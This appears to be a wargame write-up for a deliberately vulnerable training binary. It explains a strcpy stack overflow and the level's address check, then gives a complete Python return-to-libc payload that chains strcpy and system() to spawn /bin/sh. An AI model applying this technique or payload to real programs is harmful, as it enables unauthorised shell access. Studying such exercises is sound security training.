# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
This program uses strcpy function that does not check boundary so I can overwrite SFP & RET address.

The protection code is:
```c
// check address
addr = (char *)&strcpy;
if(memcmp(argv[1]+44, &addr, 4) != 0){
  printf("You must fall in love with strcpy()\n");
  exit(0);
}

// dangerous waterfall
memset(buffer+40+8, 'A', 4);
```
I have to use strcpy function and I cannot use strcpy's return address.

# Exploitation
First, I found strcpy address:
```
0x8048721 <main+109>:	push   %eax
0x8048722 <main+110>:	call   0x8048410 <strcpy>
0x8048727 <main+115>:	add    $0x8,%esp
```
strcpy's address: 0x08048410

Now, I will give payload in buffer and use strcpy function to copy that payload on strcpy's ret address.

The payload will be:
```
-------------------------------------------------------------------------------------------------------------------------------------------------
| system's address | AAAA | system's param(/bin/sh) | "A"*32 | strcpy's address | "AAAA" | strcpy's ret address(dst) | buffer's address(source) |
-------------------------------------------------------------------------------------------------------------------------------------------------
```
In C code, strcpy's ret address is filled with "A"*4 but in this payload, use strcpy function to bypass that waterfall("AAAA") by copy buffer(source) to waterfall(AAAA(source)).

# Payload
```python
import os

filename = "/home/succubus/nightmare"

payload = ""
payload = payload + "\xe0\x8a\x05\x40" # system's address
payload = payload + "A"*4 # system's ret address
payload = payload + "\xf9\xbf\x0f\x40" # system's param(/bin/sh)
payload = payload + "A"*32 # dummy
payload = payload + "\x10\x84\x04\x08" # strcpy's address(ret)
payload = payload + "A"*4 # waterfall(strcpy's ret address)
payload = payload + "\xa0\xfa\xff\xbf" # strcpy's dst(strcpy's ret)
payload = payload + "\x70\xfa\xff\xbf" # strcpy's source(buffer)

os.execv(filename, [filename, payload])
```
